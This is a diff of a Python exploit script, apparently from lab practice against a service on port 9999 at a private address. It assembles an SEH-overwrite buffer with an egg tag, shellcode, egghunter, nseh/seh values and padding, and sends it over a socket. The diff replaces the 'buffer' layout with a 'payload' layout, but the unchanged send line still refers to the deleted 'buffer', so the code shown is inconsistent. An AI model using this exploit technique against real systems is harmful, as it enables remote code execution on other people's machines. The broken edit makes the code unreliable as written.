@@ -61,28 +61,19 @@ seh  = "\xb4\x10\x50\x62"
 nseh = "\xeb\xce\x90\x90"
 egg  = "w00tw00t"
 
-buffer = 'A' * (3551 - len(egg + shellcode))
-buffer += egg
-buffer += shellcode
-buffer += nseh
-buffer += seh
-buffer += egghunter
-buffer += 'C' * (5000 - len(buffer))
-
-#payload = egg
-#payload += shellcode
-#payload += "A" * (3503 - len(payload))
-#payload += egghunter
-#payload += "B" * (3547 - len(payload))
-##payload += "\x90" * 16
-#payload += nseh
-#payload += seh
-#payload += "D" * (5000-len(payload))
+payload = egg
+payload += shellcode
+payload += "A" * (3503 - len(payload))
+payload += egghunter
+payload += "B" * (3547 - len(payload))
+payload += nseh
+payload += seh
+payload += "D" * (5000-len(payload))
 
 #print("Delivering payload: " + payload)
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.122.6", 9999))
+s.connect(("192.168.122.93", 9999))
 
 s.send(command+buffer)
 s.recv(1024)
